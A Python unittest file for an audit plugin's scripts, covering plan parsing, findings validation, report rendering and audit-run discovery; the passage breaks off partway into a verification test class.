"""Tests for the ai-utilities audit scripts.

This plugin had no tests at all, and `scripts/validate-repo.py` named its two test
directories explicitly, so it could not have run them if it had. Both are fixed:
the validator discovers `*/tests` now, and this file is what it finds here.
"""

from __future__ import annotations

import contextlib
import importlib.util
import io
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "scripts"
FIXTURES = Path(__file__).resolve().parent / "fixtures"
sys.path.insert(0, str(SCRIPTS))

import audit_common  # noqa: E402
import checks  # noqa: E402
import families  # noqa: E402
import findings as findings_mod  # noqa: E402
import plan_parse  # noqa: E402
import render_report  # noqa: E402
import resolver  # noqa: E402
import stack_probe  # noqa: E402
import verify as verify_mod  # noqa: E402


def _load_run_audit():
    """`run-audit.py` is not a legal module name, so import it by path."""
    spec = importlib.util.spec_from_file_location("run_audit", SCRIPTS / "run-audit.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


run_audit = _load_run_audit()


class AuditCommonTests(unittest.TestCase):
    def test_front_matter_parses_scalars_and_lists(self) -> None:
        text = '---\ninitiative_id: alpha\nstatus: draft\nsource_artifacts:\n  - "docs/a.md"\n  - docs/b.md\n---\n\n# Body\n'
        front, body = audit_common.parse_front_matter(text)
        self.assertEqual(front["initiative_id"], "alpha")
        self.assertEqual(front["source_artifacts"], ["docs/a.md", "docs/b.md"])
        self.assertTrue(body.startswith("\n# Body") or body.startswith("# Body"))

    def test_front_matter_absent_returns_the_whole_text(self) -> None:
        front, body = audit_common.parse_front_matter("# Just a heading\n")
        self.assertEqual(front, {})
        self.assertEqual(body, "# Just a heading\n")

    def test_audit_dir_is_one_directory_per_run(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            first = audit_common.audit_dir(root, "2026-08-06_101530")
            second = audit_common.audit_dir(root, "2026-08-06_101531")
            self.assertNotEqual(first, second)
            # Names still sort chronologically, so audit-resolver's newest-by-name
            # discovery keeps working against a directory instead of a bare file.
            self.assertLess(first.name, second.name)

    def test_scan_files_prunes_generated_trees(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "src").mkdir()
            (root / "src" / "keep.py").write_text("x = 1\n", encoding="utf-8")
            (root / "node_modules" / "pkg").mkdir(parents=True)
            (root / "node_modules" / "pkg" / "skip.py").write_text("y = 2\n", encoding="utf-8")
            found = {path.name for path in audit_common.scan_files(root, frozenset({".py"}))}
            self.assertIn("keep.py", found)
            self.assertNotIn("skip.py", found)


class StackProbeTests(unittest.TestCase):
    def test_workspace_rung_wins_and_is_labelled(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / ".project" / ".engineering" / "context"
            target.mkdir(parents=True)
            audit_common.write_json(
                target / "stack.json",
                {"backend": ["Elixir"], "database": ["CouchDB"], "package_manager": "mix", "test_commands": {}},
            )
            stack = stack_probe.resolve_stack(root)
            self.assertEqual(stack["detector"], "workspace")
            self.assertEqual(stack["backend"], ["Elixir"])

    def test_vendored_rung_detects_a_python_repo_without_any_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "pyproject.toml").write_text("[tool.ruff]\n", encoding="utf-8")
            (root / "tests").mkdir()
            stack = stack_probe.resolve_stack(root, prefer="vendored")
            self.assertEqual(stack["detector"], "vendored")
            self.assertEqual(stack["backend"], ["Python"])
            self.assertEqual(stack["package_manager"], "python")
            self.assertIn("unit", stack["test_commands"])

    def test_every_rung_answers_the_same_shape(self) -> None:
        # Callers gate whole check families on these keys. A rung that omitted one
        # would silently switch a family off rather than fail, which is precisely
        # the not-applicable / not-checked conflation the rebuild exists to end.
        required = {"detector", "frameworks", "backend", "database", "testing", "package_manager", "test_commands"}
        for rung in ("workspace", "imported", "vendored"):
            with self.subTest(rung=rung):
                stack = stack_probe.resolve_stack(ROOT.parent, prefer=rung)
                self.assertTrue(required.issubset(stack), sorted(required - set(stack)))

    def test_a_repo_with_no_markers_still_answers(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            stack = stack_probe.resolve_stack(Path(tmp), prefer="vendored")
            self.assertEqual(stack["backend"], [])
            self.assertEqual(stack["database"], [])
            self.assertIsNone(stack["package_manager"])


class FixtureTests(unittest.TestCase):
    def test_the_tiny_repo_fixture_is_intact(self) -> None:
        # The functional eval and the audit's own tests both point at this fixture.
        # Its eval suite used to carry a `<replace-with-real-path>` placeholder, so
        # the functional case had never once been runnable.
        fixture = FIXTURES / "tiny-python-repo"
        self.assertTrue((fixture / "PLAN.md").is_file())
        self.assertTrue((fixture / "src" / "a.py").is_file())
        plan = (fixture / "PLAN.md").read_text(encoding="utf-8")
        self.assertIn("### 1.1", plan, "the fixture must exercise the numbered-headings extractor")
        self.assertNotIn("- [ ]", plan, "a checkbox would let a checkbox-only parser pass by accident")


class PlanParseTests(unittest.TestCase):
    def _parse(self, text: str) -> dict:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            plan = root / "PLAN.md"
            plan.write_text(text, encoding="utf-8")
            return plan_parse.parse_plan(plan, root)

    def test_checkboxes_win_outright(self) -> None:
        result = self._parse("# P\n\n- [x] One\n- [ ] Two\n")
        self.assertEqual(result["parsed_by"], "action-items")
        self.assertEqual([item.status for item in result["items"]], ["complete", "not-started"])

    def test_numbered_headings_are_read_when_there_are_no_checkboxes(self) -> None:
        # The one real plan on record stated its items this way. A checkbox-only
        # parser would have found zero items in it and audited nothing, confidently.
        result = self._parse("# P\n\n## 1. Group\n\n### 1.1 First\n\ntext\n\n### 1.2 Second\n\ntext\n")
        self.assertEqual(result["parsed_by"], "numbered-headings")
        self.assertEqual([item.id for item in result["items"]], ["1.1", "1.2"])

    def test_group_headings_are_not_counted_as_items(self) -> None:
        # `## 1. Group` above `### 1.1` is a table of contents entry, not work.
        # Counting it inflates the denominator with an item nothing can satisfy.
        result = self._parse("# P\n\n## 1. Group\n\n### 1.1 A\n\n### 1.2 B\n\n## 2. Other\n\n### 2.1 C\n")
        self.assertEqual({item.id for item in result["items"]}, {"1.1", "1.2", "2.1"})

    def test_the_finer_heading_extractor_wins_over_the_coarser_one(self) -> None:
        # Regression: phase-sections matched three `## Wave N` headings and won by
        # cascade order, so a nineteen-item plan was read as three items.
        text = "# P\n\n## Wave 1 - Blockers\n\n### 1.1 A\n\n### 1.2 B\n\n## Wave 2 - Rest\n\n### 2.1 C\n"
        result = self._parse(text)
        self.assertEqual(result["parsed_by"], "numbered-headings")
        self.assertEqual(result["item_count"], 3)

    def test_an_unparseable_plan_reports_nothing_rather_than_guessing(self) -> None:
        result = self._parse("# Plan\n\nSome prose with no structure at all.\n")
        self.assertIsNone(result["parsed_by"])
        self.assertEqual(result["items"], [])

    def test_mentions_are_collected_for_the_drift_join(self) -> None:
        result = self._parse("# P\n\n### 1.1 A\n\nImplement `scripts/foo.py`.\n\n### 1.2 B\n\nNothing.\n")
        self.assertIn("scripts/foo.py", result["items"][0].mentions)
        plan_parse.mark_unverifiable(result["items"], {"scripts/foo.py"})
        self.assertEqual(result["items"][0].status, "unverifiable")
        self.assertEqual(result["items"][1].status, "not-started")

    # --- markdown tables -------------------------------------------------------

    def test_a_numbered_table_is_read_as_an_inventory(self) -> None:
        text = (
            "# P\n\n## Build order\n\n"
            "| # | Task | Issue |\n| --- | --- | --- |\n"
            "| 1 | Add the table | WEB-101 |\n| 2 | Wire the gateway | WEB-102 |\n"
        )
        result = self._parse(text)
        self.assertEqual(result["parsed_by"], "table")
        self.assertEqual([item.id for item in result["items"]], ["1", "2"])
        self.assertEqual([item.title for item in result["items"]], ["Add the table", "Wire the gateway"])

    def test_a_table_of_issue_keys_is_read_too(self) -> None:
        text = (
            "# P\n\n## Work\n\n"
            "| Key | Deliverable |\n| --- | --- |\n"
            "| WEB-101 | Add the table |\n| WEB-102 | Wire the gateway |\n"
        )
        result = self._parse(text)
        self.assertEqual(result["parsed_by"], "table")
        self.assertEqual([item.id for item in result["items"]], ["WEB-101", "WEB-102"])

    def test_a_comparison_table_is_not_mistaken_for_a_plan(self) -> None:
        # The reason the extractor requires numbered rows. A table is a common way to
        # write something that is not an inventory, and reading one as a plan would
        # trade this bug for a worse one.
        text = (
            "# P\n\n## Options\n\n"
            "| Option | Pros | Cons |\n| --- | --- | --- |\n"
            "| Postgres | mature | heavier |\n| SQLite | simple | single writer |\n"
            "\n## Steps\n\n1. First thing\n2. Second thing\n"
        )
        result = self._parse(text)
        self.assertEqual(result["parsed_by"], "ordered-list")

    def test_a_table_plan_outranks_an_unrelated_ordered_list(self) -> None:
        """WEB-399, reproduced.

        The plan stated fifteen items in two tables and also contained a six-step
        staging checklist. `ordered-list` found the checklist, nothing else matched,
        and the report announced "4 of 6 plan items complete (67%)" over a real
        denominator of twenty-one.
        """
        result = plan_parse.parse_plan(FIXTURES / "table-plan-repo" / "PLAN.md", FIXTURES / "table-plan-repo")
        self.assertEqual(result["parsed_by"], "table")
        self.assertEqual([item.id for item in result["items"]], ["1", "2", "3", "4", "5"])
        # The staging checklist is not in the inventory.
        self.assertNotIn("Freeze the release branch", [item.title for item in result["items"]])
        # And the table rows keep the rest of the row, so the issue key is reachable.
        self.assertIn("WEB-101", result["items"][0].body)

    def test_a_numbered_list_inside_a_code_fence_is_not_an_inventory(self) -> None:
        text = "# P\n\nExample:\n\n```text\n1. first\n2. second\n3. third\n```\n"
        self.assertIsNone(self._parse(text)["parsed_by"])

    # --- parse coverage --------------------------------------------------------

    def test_coverage_records_every_extractor_not_just_the_winner(self) -> None:
        text = (
            "# P\n\n## Build order\n\n"
            "| # | Task |\n| --- | --- |\n| 1 | A |\n| 2 | B |\n| 3 | C |\n"
            "\n## Steps\n\n1. one\n2. two\n"
        )
        counts = self._parse(text)["coverage"]["extractor_counts"]
        self.assertEqual(counts["table"], 3)
        # The loser's count is kept, which is what makes a partial parse visible.
        self.assertEqual(counts["ordered-list"], 2)

    def test_a_section_stating_work_that_produced_no_items_is_reported(self) -> None:
        # The signal that was missing entirely. "Parsed 6 items from 1 of 4 candidate
        # sections" would have made the WEB-399 misparse self-evident.
        text = (
            "# P\n\n## Build order\n\n"
            "| # | Task |\n| --- | --- |\n| 1 | A |\n| 2 | B |\n"
            "\n## Staging\n\n1. freeze\n2. snapshot\n"
        )
        coverage = self._parse(text)["coverage"]
        self.assertFalse(coverage["confident"])
        self.assertEqual(coverage["unparsed_sections"], ["Staging"])
        self.assertEqual(coverage["candidate_sections"], 2)
        self.assertEqual(coverage["sections_parsed"], 1)

    def test_a_plan_the_extractor_fully_accounted_for_is_confident(self) -> None:
        text = "# P\n\n## Work\n\n| # | Task |\n| --- | --- |\n| 1 | A |\n| 2 | B |\n"
        coverage = self._parse(text)["coverage"]
        self.assertTrue(coverage["confident"])
        self.assertEqual(coverage["unparsed_sections"], [])

    def test_one_stray_numbered_line_is_noted_but_does_not_withdraw_the_percentage(self) -> None:
        # A warning that fires on every document is one nobody reads, and most real
        # plans contain a numbered line somewhere that is not an inventory item.
        text = (
            "# P\n\n## Work\n\n| # | Task |\n| --- | --- |\n| 1 | A |\n| 2 | B |\n"
            "\n## Notes\n\n1. one caveat worth recording\n"
        )
        coverage = self._parse(text)["coverage"]
        self.assertEqual(coverage["unparsed_sections"], ["Notes"])
        self.assertEqual(coverage["unaccounted_rows"], 1)
        self.assertTrue(coverage["confident"], "one row cannot move a denominator")

    def test_enough_unaccounted_work_does_withdraw_the_percentage(self) -> None:
        text = (
            "# P\n\n## Work\n\n| # | Task |\n| --- | --- |\n| 1 | A |\n| 2 | B |\n"
            "\n## Staging\n\n1. freeze\n2. snapshot\n3. deploy\n"
        )
        coverage = self._parse(text)["coverage"]
        self.assertEqual(coverage["unaccounted_rows"], 3)
        self.assertFalse(coverage["confident"])

    def test_the_existing_fixture_still_parses_as_it_did(self) -> None:
        # Guards against the new tier stealing a plan the heading extractor owns.
        result = plan_parse.parse_plan(FIXTURES / "tiny-python-repo" / "PLAN.md", FIXTURES / "tiny-python-repo")
        self.assertEqual(result["parsed_by"], "numbered-headings")
        self.assertEqual([item.id for item in result["items"]], ["1.1", "1.2", "2.1"])


class FindingsTests(unittest.TestCase):
    def _finding(self, line: int, title: str = "Unused import `json`") -> findings_mod.Finding:
        return findings_mod.Finding(
            family="static-analysis",
            rule="ruff/F401",
            severity="warning",
            title=title,
            evidence=[findings_mod.Evidence("scripts/foo.py", line, "import json")],
        )

    def test_identity_survives_a_line_move_but_content_hash_does_not(self) -> None:
        # The whole reason there are two hashes. One hash over fields including the
        # line means adding an import above a finding gives it a new identity, and
        # the tracker files a second issue for the same problem.
        first, moved = self._finding(12), self._finding(48)
        self.assertEqual(first.identity, moved.identity)
        self.assertNotEqual(first.content_hash, moved.content_hash)

    def test_identity_differs_when_the_finding_differs(self) -> None:
        self.assertNotEqual(self._finding(12).identity, self._finding(12, "Unused import `os`").identity)

    def test_a_non_verdict_outcome_must_state_a_reason(self) -> None:
        for outcome in findings_mod.OUTCOMES_NEEDING_REASON:
            with self.subTest(outcome=outcome):
                bare = findings_mod.FamilyResult(id="x", title="X", outcome=outcome)
                self.assertTrue(bare.validate(), f"{outcome} with no reason must not validate")
                explained = findings_mod.FamilyResult(id="x", title="X", outcome=outcome, reason="because")
                self.assertEqual(explained.validate(), [])

    def test_passed_with_findings_and_failed_without_are_both_rejected(self) -> None:
        self.assertTrue(findings_mod.FamilyResult(id="x", title="X", outcome="failed").validate())
        with_finding = findings_mod.FamilyResult(id="x", title="X", outcome="passed", findings=[self._finding(1)])
        self.assertTrue(with_finding.validate())

    def test_every_registered_family_appears_in_output(self) -> None:
        # This is the replacement for "never skip a phase". That was prose, and the
        # single real run on record routed straight around it. This is a condition
        # the run fails on.
        document = findings_mod.build_document(
            run_id="T",
            generated_at="2026-01-01T00:00:00+00:00",
            root=".",
            plan={"path": None, "parsed_by": None, "item_count": 0},
            stack={},
            results=[findings_mod.FamilyResult(id="secrets", title="Secrets", outcome="passed")],
            plan_items=[],
        )
        problems = findings_mod.validate_document(document, families.registered_ids())
        self.assertTrue(any("registered but absent" in problem for problem in problems))

    def _document_with(self, finding: dict) -> dict:
        return {
            "schema": findings_mod.SCHEMA,
            "families": [{"id": name, "outcome": "passed", "reason": "", "finding_ids": []} for name in ["secrets"]],
            "findings": [finding],
        }

    def test_every_finding_status_round_trips(self) -> None:
        for status in findings_mod.FINDING_STATUSES:
            with self.subTest(status=status):
                needs_reason = status in findings_mod.FINDING_STATUSES_NEEDING_REASON
                finding = findings_mod.Finding(
                    family="secrets",
                    rule="secret/generic-assignment",
                    severity="critical",
                    title="Possible credential",
                    status=status,
                    status_reason="checked, it is a fixture" if needs_reason else "",
                )
                self.assertEqual(finding.validate(), [])
                self.assertEqual(finding.as_dict()["status"], status)
                self.assertEqual(finding.dismissed, status in findings_mod.DISMISSED_STATUSES)

    def test_a_dismissed_finding_must_state_a_reason(self) -> None:
        # Same rule the family outcomes already carry: the claim that something needs
        # no action is exactly the claim that has to show its evidence.
        for status in findings_mod.FINDING_STATUSES_NEEDING_REASON:
            with self.subTest(status=status):
                bare = self._document_with(_finding_dict(status=status, status_reason=""))
                self.assertTrue(
                    any("must state a reason" in problem for problem in findings_mod.validate_document(bare, [])),
                    f"{status} with no reason must not validate",
                )
                explained = self._document_with(_finding_dict(status=status, status_reason="because"))
                self.assertEqual(findings_mod.validate_document(explained, []), [])

    def test_an_unknown_finding_status_is_rejected(self) -> None:
        # It was a free string, so a typo in a hand-edit was silently accepted and
        # then silently counted as live work.
        document = self._document_with(_finding_dict(status="flase-positive", status_reason="typo"))
        self.assertTrue(any("unknown status" in problem for problem in findings_mod.validate_document(document, [])))

    def test_an_unknown_severity_is_rejected(self) -> None:
        # Unknown severities sorted last via a `99` fallback and dropped out of the
        # header counts entirely, so the finding existed and was invisible.
        document = self._document_with(_finding_dict(severity="blocker"))
        self.assertTrue(any("unknown severity" in problem for problem in findings_mod.validate_document(document, [])))

    def test_dismissed_findings_are_excluded_from_the_document_totals(self) -> None:
        def finding(status: str) -> findings_mod.Finding:
            return findings_mod.Finding(
                family="secrets",
                rule="secret/generic-assignment",
                severity="critical",
                title=f"Possible credential ({status})",
                status=status,
                status_reason="fixture" if status != "open" else "",
            )

        document = findings_mod.build_document(
            run_id="T",
            generated_at="2026-01-01T00:00:00+00:00",
            root=".",
            plan={"path": None, "parsed_by": None, "item_count": 0},
            stack={},
            results=[
                findings_mod.FamilyResult(
                    id="secrets",
                    title="Secrets",
                    outcome="failed",
                    findings=[finding("open"), finding("false-positive"), finding("accepted-risk")],
                )
            ],
            plan_items=[],
        )
        self.assertEqual(document["totals"]["critical"], 1)
        self.assertEqual(document["totals"]["findings_open"], 1)
        self.assertEqual(document["totals"]["findings_dismissed"], 2)


class FamilyRegistryTests(unittest.TestCase):
    def _ctx(self, **stack) -> families.Ctx:
        base = {"frameworks": [], "backend": [], "database": [], "testing": [], "test_commands": {}}
        return families.Ctx(root=Path("."), stack={**base, **stack}, plan={"parsed_by": None}, files=[])

    def test_a_family_that_does_not_apply_says_why(self) -> None:
        for family in families.REGISTRY:
            relevant, reason = family.applies_when(self._ctx())
            if not relevant:
                self.assertTrue(reason.strip(), f"{family.id} returned not-applicable with no reason")

    def test_no_database_makes_the_data_layer_not_applicable(self) -> None:
        relevant, reason = families.BY_ID["data-layer"].applies_when(self._ctx())
        self.assertFalse(relevant)
        self.assertIn("no database", reason)

    def test_a_detected_database_makes_it_apply(self) -> None:
        relevant, reason = families.BY_ID["data-layer"].applies_when(self._ctx(database=["PostgreSQL"]))
        self.assertTrue(relevant)
        self.assertIn("PostgreSQL", reason)

    def test_registry_ids_are_unique(self) -> None:
        ids = families.registered_ids()
        self.assertEqual(len(ids), len(set(ids)))


def _finding_dict(**overrides) -> dict:
    """A findings.json finding entry, shaped as `Finding.as_dict` emits it."""
    base = {
        "id": "F001",
        "identity": "abc123",
        "content_hash": "def456",
        "family": "secrets",
        "rule": "secret/generic-assignment",
        "severity": "critical",
        "title": "Possible hardcoded credential in api/src/api.test.ts",
        "detail": "",
        "evidence": [{"path": "api/src/api.test.ts", "line": 25, "excerpt": ""}],
        "plan_items": [],
        "route": {},
        "suggested_strategy": "human-input",
        "status": "open",
        "status_reason": "",
        "tracker": {"provider": None, "issue_id": None, "url": None},
    }
    base.update(overrides)
    return base


class RenderTests(unittest.TestCase):
    def _document(self, inventory_outcome: str, reason: str = "") -> dict:
        return {
            "run_id": "T",
            "generated_at": "2026-01-01T00:00:00+00:00",
            "root": ".",
            "plan": {"path": "PLAN.md", "parsed_by": "numbered-headings", "item_count": 2},
            "stack": {
                "frameworks": [],
                "backend": ["Python"],
                "database": [],
                "package_manager": "python",
                "detector": "vendored",
            },
            "families": [
                {
                    "id": "plan-inventory",
                    "title": "Plan completion",
                    "outcome": inventory_outcome,
                    "reason": reason,
                    "applies_because": "",
                    "commands": [],
                    "finding_ids": [],
                }
            ],
            "findings": [],
            "plan_items": [
                {
                    "id": "1.1",
                    "title": "A",
                    "source": "PLAN.md:3",
                    "status": "not-started",
                    "reason": "",
                    "mentions": [],
                    "extractor": "numbered-headings",
                    "verified_by": [],
                },
                {
                    "id": "1.2",
                    "title": "B",
                    "source": "PLAN.md:5",
                    "status": "not-started",
                    "reason": "",
                    "mentions": [],
                    "extractor": "numbered-headings",
                    "verified_by": [],
                },
            ],
            "totals": {"critical": 0, "warning": 0, "suggestion": 0},
        }

    def test_no_percentage_is_printed_when_nothing_assessed_completion(self) -> None:
        # "0 of 2 complete (0%)" reads as a measurement and is the absence of one.
        # This is the same defect class as a checker hardcoding a clean verdict.
        text = render_report.render(self._document("not-checked", "assessed by the skill, not by a command"))
        self.assertNotIn("(0%)", text)
        self.assertIn("None have been assessed yet", text)
        self.assertIn("not a verdict", text)

    def test_a_percentage_is_printed_once_completion_was_assessed(self) -> None:
        text = render_report.render(self._document("failed"))
        self.assertIn("0 of 2 plan items complete (0%)", text)

    def test_families_that_did_not_run_are_listed_with_their_reasons(self) -> None:
        text = render_report.render(self._document("not-checked", "needs judgement"))
        self.assertIn("## Not run (1)", text)
        self.assertIn("needs judgement", text)

    def _with_findings(self, findings: list[dict]) -> dict:
        document = self._document("not-checked", "assessed by the skill")
        document["findings"] = findings
        document["families"].append(
            {
                "id": "secrets",
                "title": "Secret exposure",
                "outcome": "failed",
                "reason": "",
                "applies_because": "always relevant",
                "commands": [],
                "finding_ids": [item["id"] for item in findings],
            }
        )
        return document

    def test_an_open_finding_is_counted_and_listed(self) -> None:
        text = render_report.render(self._with_findings([_finding_dict()]))
        self.assertIn("Critical 1 ·", text)
        self.assertIn("### Critical (1)", text)
        self.assertNotIn("## Dismissed", text)

    def test_a_dismissed_finding_leaves_the_counts_and_gains_a_reason(self) -> None:
        # The whole defect: an assessment written into findings.json changed nothing
        # in report.md, so six examined criticals still read as six things to fix.
        text = render_report.render(
            self._with_findings(
                [
                    _finding_dict(
                        status="false-positive",
                        status_reason="the literal says `not-a-real-token`; it is a test fixture",
                    )
                ]
            )
        )
        self.assertIn("Critical 0 ·", text)
        self.assertNotIn("### Critical (1)", text)
        self.assertIn("## Dismissed (1)", text)
        self.assertIn("not-a-real-token", text)
        self.assertIn("false-positive", text)
        # And the verdict table stops advertising it as outstanding work.
        self.assertIn("| Secret exposure | **FAILED** | 0 |", text)

    def test_a_stale_persisted_total_does_not_win_over_the_findings(self) -> None:
        # `totals` is written once and the document is hand-edited afterwards, so a
        # renderer that trusts it reports the pre-assessment number forever.
        document = self._with_findings([_finding_dict(status="false-positive", status_reason="test fixture")])
        document["totals"]["critical"] = 7
        self.assertIn("Critical 0 ·", render_report.render(document))

    def test_a_plan_item_missing_its_status_does_not_break_the_render(self) -> None:
        document = self._document("failed")
        del document["plan_items"][0]["status"]
        self.assertIn("Plan Completion Audit", render_report.render(document))

    def test_no_percentage_when_the_extractor_did_not_account_for_the_plan(self) -> None:
        # WEB-399's actual harm: a real numerator over a wrong denominator. The items
        # WERE assessed, so the existing `assessed` gate passes and cannot help here.
        document = self._document("failed")
        document["plan"]["coverage"] = {
            "confident": False,
            "candidate_sections": 4,
            "sections_parsed": 1,
            "unparsed_sections": ["Batch 1", "Batch 2", "Part 3"],
            "unaccounted_rows": 15,
            "extractor_counts": {"ordered-list": 6, "table": 15},
        }
        text = render_report.render(document)
        self.assertNotIn("(0%)", text)
        self.assertIn("No percentage is given", text)
        self.assertIn("1 of 4", text)
        self.assertIn("3 section(s) state work that produced no plan items", text)
        self.assertIn("`Batch 1`", text)

    def test_a_percentage_returns_once_coverage_is_confident(self) -> None:
        document = self._document("failed")
        document["plan"]["coverage"] = {"confident": True, "unparsed_sections": []}
        self.assertIn("0 of 2 plan items complete (0%)", render_report.render(document))

    def _with_families(self, extra: list[dict]) -> dict:
        document = self._document("not-checked", "assessed by the skill")
        document["families"].extend(extra)
        return document

    def test_a_run_with_no_test_evidence_says_so_in_one_sentence(self) -> None:
        # WEB-403: three scattered `not-checked` rows do not add up to this sentence
        # for anybody skimming a verdict table.
        document = self._with_families(
            [
                {
                    "id": name,
                    "title": name,
                    "outcome": "not-checked",
                    "reason": "came from the repo's own stack.json",
                    "applies_because": "",
                    "commands": [],
                    "finding_ids": [],
                }
                for name in ("tests", "static-analysis", "build")
            ]
        )
        text = render_report.render(document)
        self.assertIn("This audit contains no test, lint or typecheck, build evidence.", text)

    def test_a_run_that_did_test_makes_no_such_claim(self) -> None:
        document = self._with_families(
            [
                {
                    "id": "tests",
                    "title": "Test suite",
                    "outcome": "passed",
                    "reason": "",
                    "applies_because": "",
                    "commands": [],
                    "finding_ids": [],
                }
            ]
        )
        self.assertNotIn("no test", render_report.render(document))

    def test_a_repo_with_no_test_command_is_not_reported_as_missing_evidence(self) -> None:
        # `not-applicable` is a different claim from `not-checked`, and conflating them
        # is the distinction this whole registry exists to keep.
        document = self._with_families(
            [
                {
                    "id": "tests",
                    "title": "Test suite",
                    "outcome": "not-applicable",
                    "reason": "the detected stack declares no unit command",
                    "applies_because": "",
                    "commands": [],
                    "finding_ids": [],
                }
            ]
        )
        self.assertNotIn("no test", render_report.render(document))

    def test_a_scope_warning_reaches_the_report(self) -> None:
        document = self._document("not-checked", "assessed by the skill")
        document["scope_warnings"] = ["file scope fell back to a directory walk"]
        self.assertIn("Scope warning", render_report.render(document))

    def _render_cli(self, document: dict, *extra: str) -> tuple[int, str]:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "findings.json"
            audit_common.write_json(path, document)
            argv = ["render_report.py", str(path), *extra]
            err = io.StringIO()
            with (
                mock.patch.object(sys, "argv", argv),
                contextlib.redirect_stdout(io.StringIO()),
                contextlib.redirect_stderr(err),
            ):
                code = render_report.main()
        return code, err.getvalue()

    def _validatable(self) -> dict:
        # A document shaped so validate_document has no complaint of its own.
        document = self._document("not-checked", "assessed by the skill")
        document["schema"] = findings_mod.SCHEMA
        document["families"] = [
            {"id": name, "title": name, "outcome": "not-checked", "reason": "n/a", "finding_ids": []}
            for name in families.registered_ids()
        ]
        return document

    def test_check_accepts_a_well_formed_document(self) -> None:
        code, _err = self._render_cli(self._validatable(), "--check")
        self.assertEqual(code, 0)

    def test_check_rejects_a_typo_in_a_hand_edited_status(self) -> None:
        # WEB-405: step 4 is a hand-edit, and nothing validated the result. A typo in
        # a status rendered happily and silently changed what the report claimed.
        document = self._validatable()
        document["findings"] = [_finding_dict(status="flase-positive", status_reason="typo")]
        code, err = self._render_cli(document, "--check")
        self.assertEqual(code, 1)
        self.assertIn("unknown status", err)

    def test_a_render_of_an_invalid_document_still_writes_but_exits_non_zero(self) -> None:
        document = self._validatable()
        document["findings"] = [_finding_dict(severity="blocker")]
        code, err = self._render_cli(document)
        self.assertEqual(code, 1)
        self.assertIn("validation problem", err)

    def test_validation_errors_are_no_longer_invisible(self) -> None:
        # They were written into findings.json and rendered nowhere, so a document
        # that failed its own validation still produced a clean-looking report.
        document = self._document("not-checked", "assessed by the skill")
        document["validation_errors"] = ["secrets: unknown outcome 'ok'"]
        self.assertIn("failed 1 validation check(s)", render_report.render(document))


class ResolverTests(unittest.TestCase):
    def _run_dir(self, root: Path, stamp: str, findings: list[dict]) -> Path:
        target = root / audit_common.AUDIT_DIR / stamp
        audit_common.write_json(
            target / "findings.json",
            {
                "schema": findings_mod.SCHEMA,
                "run_id": stamp,
                "findings": findings,
                "families": [
                    {"id": "secrets", "title": "S", "outcome": "passed", "reason": "", "finding_ids": []},
                    {
                        "id": "data-layer",
                        "title": "D",
                        "outcome": "not-applicable",
                        "reason": "no database",
                        "finding_ids": [],
                    },
                ],
                "plan_items": [],
                "totals": {},
            },
        )
        return target

    def _finding(self, fid: str, severity: str, family: str = "secrets") -> dict:
        return {
            "id": fid,
            "severity": severity,
            "family": family,
            "rule": "x",
            "title": f"finding {fid}",
            "evidence": [{"path": "a.py", "line": 1, "excerpt": ""}],
        }

    def test_discovery_prefers_the_newest_run_and_ignores_ledgers(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._run_dir(root, "2026-01-01_000000", [])
            newest = self._run_dir(root, "2026-06-01_000000", [])
            # A resolver ledger sitting in the audits tree must never be picked up:
            # globbing `**/*audit*.md` for the report is what caused that before.
            ledger = root / ".project" / "audits" / "audit-resolver" / "2026-07-01"
            ledger.mkdir(parents=True)
            (ledger / "audit-resolver-ledger.md").write_text("# Ledger\n", encoding="utf-8")
            self.assertEqual(resolver.discover(root), newest / "findings.json")

    def test_discovery_returns_none_when_there_is_no_audit(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            self.assertIsNone(resolver.discover(Path(tmp)))

    def test_a_legacy_markdown_report_is_converted_and_labelled_as_such(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            report = root / audit_common.AUDIT_DIR / "2026-05-01_120000.md"
            report.parent.mkdir(parents=True)
            report.write_text(
                "# Old report\n\n"
                "| 1 | CRITICAL | `src/a.ts:42` | Something is badly wrong here |\n"
                "| 2 | WARNING | no location given at all in this row |\n",
                encoding="utf-8",
            )
            document = resolver.load(report)
            self.assertEqual(document["source"], "markdown-fallback")
            self.assertEqual(len(document["findings"]), 1)
            # The row it could not convert is counted, not dropped in silence.
            self.assertEqual(document["unconverted_rows"], 1)
            self.assertIn("could not be converted", document["families"][0]["reason"])

    def test_summary_surfaces_families_that_never_ran(self) -> None:
        # A resolution that closes every finding while a family never ran has not
        # finished the audit. The count has to be visible for that to be sayable.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._run_dir(root, "2026-06-01_000000", [self._finding("F001", "critical")])
            summary = resolver.summarise(resolver.load(resolver.discover(root)))
            self.assertEqual(summary["total"], 1)
            self.assertEqual([item["id"] for item in summary["families_not_run"]], ["data-layer"])
            self.assertEqual(summary["families_not_run"][0]["reason"], "no database")

    def test_selection_filters_and_orders_by_severity(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._run_dir(
                root,
                "2026-06-01_000000",
                [
                    self._finding("F001", "suggestion"),
                    self._finding("F002", "critical"),
                    self._finding("F003", "warning", family="dead-code"),
                ],
            )
            document = resolver.load(resolver.discover(root))
            self.assertEqual([item["id"] for item in resolver.select(document)], ["F002", "F003", "F001"])
            only_critical = resolver.select(document, severities=("critical",))
            self.assertEqual([item["id"] for item in only_critical], ["F002"])
            by_family = resolver.select(document, families=("dead-code",))
            self.assertEqual([item["id"] for item in by_family], ["F003"])


class VerifyTests(unittest.TestCase):
    def test_a_repo_wide_entrypoint_wins_over_stack_detection(self) -> None:
        # Regression (H5): verify-stack.sh re-derived commands from file presence,
        # probed for two files belonging to a different repository, and never knew
